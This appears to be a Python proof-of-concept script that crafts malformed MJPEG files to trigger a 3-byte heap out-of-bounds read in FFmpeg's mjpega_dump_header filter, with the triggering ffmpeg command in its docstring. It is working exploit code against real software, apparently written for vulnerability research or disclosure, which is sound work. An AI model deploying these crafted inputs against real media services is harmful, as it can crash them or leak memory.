#!/usr/bin/env python3
"""
PoC generator for VULN 002: Heap OOB Read in mjpega_dump_header.c (line 83)

Vulnerability (line 83):
    if (i + 8 < in->size && AV_RL32(in->data + i + 8) == AV_RL32("mjpg"))

The guard `i + 8 < in->size` only ensures data[i+8] is accessible, but
AV_RL32 reads 4 bytes: data[i+8], data[i+9], data[i+10], data[i+11].
When in->size == i+9 (best case), 3 bytes past the buffer end are read.

Strategy:
  Two-frame MJPEG stream:
  - Frame 1: valid minimal 1x1 JPEG so the demuxer can determine codec params
  - Frame 2: malformed JPEG with APP1 positioned so that OOB occurs in BSF

  The BSF scans each packet. When it hits the APP1 marker in Frame 2 at
  position p with total packet size = p+9, it reads 3 bytes OOB.

Trigger:
  ffmpeg -f mjpeg -i crafted.mjpeg -c:v copy -bsf:v mjpegadump -f null -
"""

import struct
import os

# Minimal valid 1x1 grayscale JPEG built from scratch
# Structure: SOI, APP0(JFIF), DQT, SOF0(1x1 YCbCr), DHT(DC+AC), SOS, EOI
def build_minimal_jpeg():
    """Build a minimal but valid 1x1 JPEG that the decoder will accept."""
    data = b''

    # SOI
    data += b'\xFF\xD8'

    # APP0 (JFIF)
    jfif = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    data += b'\xFF\xE0' + struct.pack('>H', len(jfif) + 2) + jfif

    # DQT - quantization table 0 (all 1s for simplicity)
    qt = bytes([1] * 64)
    dqt_payload = b'\x00' + qt  # table id 0, no transpose
    data += b'\xFF\xDB' + struct.pack('>H', len(dqt_payload) + 2) + dqt_payload

    # SOF0 - Start of Frame (baseline DCT, 1x1 pixel, 1 component grayscale)
    # Precision=8, height=1, width=1, components=1, comp_id=1, H/V=1x1, qt=0
    sof0_payload = struct.pack('>BHHB', 8, 1, 1, 1) + bytes([1, 0x11, 0])
    data += b'\xFF\xC0' + struct.pack('>H', len(sof0_payload) + 2) + sof0_payload

    # DHT - Huffman table (DC, table 0)
    # Minimal valid Huffman table for DC coding (symbol 0x00 with length 2)
    # counts: 0 per length 1..16, then symbols
    dht_dc_counts = bytes([0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])  # 1 symbol at length 2
    dht_dc_symbols = bytes([0])  # symbol: value 0
    dht_dc_payload = b'\x00' + dht_dc_counts + dht_dc_symbols
    data += b'\xFF\xC4' + struct.pack('>H', len(dht_dc_payload) + 2) + dht_dc_payload

    # DHT - Huffman table (AC, table 0)
    # EOB-only AC table: 1 symbol at length 4 with value 0x00 (EOB)
    dht_ac_counts = bytes([0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
    dht_ac_symbols = bytes([0])  # EOB
    dht_ac_payload = b'\x10' + dht_ac_counts + dht_ac_symbols
    data += b'\xFF\xC4' + struct.pack('>H', len(dht_ac_payload) + 2) + dht_ac_payload

    # SOS - Start of Scan
    # 1 component, comp_id=1, DC=0, AC=0, Ss=0, Se=63, Ah/Al=0
    sos_header = bytes([1, 1, 0x00, 0, 63, 0])
    data += b'\xFF\xDA' + struct.pack('>H', len(sos_header) + 2) + sos_header

    # Compressed image data for 1x1 grayscale (DC=0 encoded with our Huffman table)
    # With our DC table: symbol 0 has code of length 2 (first code = 00)
    # DC diff = 0 → encode category 0 → codeword is "00" in binary
    # Byte: 00xxxxxx with stuffing → 0x00 might need stuffing
    # Simplest: use 0x3F (00111111) as the scan data byte (padding bits = 1)
    data += b'\x3F'

    # EOI
    data += b'\xFF\xD9'

    return data


def build_malformed_jpeg_oob():
    """
    Build a malformed MJPEG packet where APP1 is at position p,
    and total packet size = p + 9, causing 3-byte OOB in AV_RL32.

    The BSF scans looking for markers. When it hits APP1 at i=p:
      - Guard: p+8 < p+9 → True (passes)
      - AV_RL32(data + p+8) reads bytes at p+8, p+9, p+10, p+11
      - Only p+8 is valid (last byte) → 3 bytes OOB

    Note: there's no SOS, so BSF returns AVERROR_INVALIDDATA,
    but the OOB read already happened during guard evaluation.
    """
    # SOI at position 0-1
    data = b'\xFF\xD8'

    # APP1 at position p=2
    # 2 bytes marker + 7 bytes filler = 9 bytes total from position 2
    # Total packet size = 2 + 9 = 11
    p = 2
    data += b'\xFF\xE1'   # APP1 marker (positions 2-3)
    data += b'\x00' * 7   # padding (positions 4-10)
    # Packet ends here. Size=11. APP1 at i=2.
    # i+8=10 < 11 → True; AV_RL32(data+10) reads [10,11,12,13] → OOB

    assert len(data) == p + 9, f"Expected {p+9}, got {len(data)}"
    return data, p


def build_malformed_jpeg_oob_with_app0():
    """
    Variant: APP0 (JFIF) first (gives more realistic structure),
    then APP1 near end with OOB condition.

    Layout:
      [0..1]    SOI
      [2..N-1]  APP0 JFIF
      [N..N+1]  APP1 marker
      [N+2..N+8] 7 bytes padding
      Total size = N + 9
    """
    # SOI
    data = b'\xFF\xD8'

    # APP0 (JFIF) - standard header
    jfif = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    data += b'\xFF\xE0' + struct.pack('>H', len(jfif) + 2) + jfif

    p = len(data)  # APP1 marker position
    data += b'\xFF\xE1'   # APP1 marker
    data += b'\x00' * 7   # 7 bytes padding → packet ends at p+9

    assert len(data) == p + 9, f"Expected {p+9}, got {len(data)}"
    return data, p


if __name__ == '__main__':
    out_dir = os.path.dirname(os.path.abspath(__file__))

    # Build valid frame for probing
    valid_frame = build_minimal_jpeg()
    print(f'Valid 1x1 JPEG frame: {len(valid_frame)} bytes')

    # Build malformed frame for OOB
    malformed_basic, p_basic = build_malformed_jpeg_oob()
    print(f'Malformed JPEG (basic): {len(malformed_basic)} bytes, APP1 at {p_basic}')
    print(f'  i+8={p_basic+8} < size={len(malformed_basic)}: {p_basic+8 < len(malformed_basic)}')
    print(f'  AV_RL32 reads [{p_basic+8}..{p_basic+11}], valid=[0..{len(malformed_basic)-1}] → {len(malformed_basic)-(p_basic+9)} extra bytes OOB')

    malformed_app0, p_app0 = build_malformed_jpeg_oob_with_app0()
    print(f'Malformed JPEG (with APP0): {len(malformed_app0)} bytes, APP1 at {p_app0}')
    print(f'  i+8={p_app0+8} < size={len(malformed_app0)}: {p_app0+8 < len(malformed_app0)}')
    print(f'  AV_RL32 reads [{p_app0+8}..{p_app0+11}], valid=[0..{len(malformed_app0)-1}] → {len(malformed_app0)-(p_app0+9)} extra bytes OOB')

    # Primary: valid frame + malformed frame (two-frame MJPEG stream)
    # Two-frame approach: demuxer probes frame1, BSF processes both frames,
    # OOB triggered on frame2
    path1 = os.path.join(out_dir, 'vuln_002_input.mjpeg')
    with open(path1, 'wb') as f:
        f.write(valid_frame + malformed_basic)
    print(f'\nWritten {path1}: {len(valid_frame)+len(malformed_basic)} bytes (2 frames)')

    # Variant: single malformed frame (for input BSF approach)
    path2 = os.path.join(out_dir, 'vuln_002_input_single.mjpeg')
    with open(path2, 'wb') as f:
        f.write(malformed_basic)
    print(f'Written {path2}: {len(malformed_basic)} bytes (1 malformed frame)')

    # Variant: APP0 + truncated APP1
    path3 = os.path.join(out_dir, 'vuln_002_input_app0.mjpeg')
    with open(path3, 'wb') as f:
        f.write(valid_frame + malformed_app0)
    print(f'Written {path3}: {len(valid_frame)+len(malformed_app0)} bytes')

    # Standalone variant: just malformed frame with APP0 (for debugging)
    path4 = os.path.join(out_dir, 'vuln_002_input_app0_single.mjpeg')
    with open(path4, 'wb') as f:
        f.write(malformed_app0)
    print(f'Written {path4}: {len(malformed_app0)} bytes (1 malformed frame with APP0)')
